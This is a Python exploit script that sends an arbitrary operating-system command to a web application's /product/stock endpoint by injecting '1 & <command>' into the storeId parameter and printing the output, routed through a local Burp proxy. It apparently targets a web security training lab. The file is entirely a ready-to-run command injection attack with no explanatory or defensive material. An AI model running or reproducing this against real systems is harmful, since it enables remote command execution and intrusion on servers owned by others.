import requests
import sys
import urllib3

# Disable insecure warnings (useful when intercepting via proxy)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Optional proxy (Burp Suite) – adjust as needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def run_command(url, command):
    stock_path = '/product/stock'
    # The vulnerable parameter concatenates the command with '&'
    command_injection = f"1 & {command}"
    params = {'productId': '1', 'storeId': command_injection}
    r = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
    if len(r.text) > 3:
        print("[+] Command output:\n" + r.text)
    else:
        print("[-] No visible output – the command may have failed.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <BASE_URL> <COMMAND>")
        sys.exit(1)
    base_url = sys.argv[1].rstrip('/')
    command = sys.argv[2]
    run_command(base_url, command)
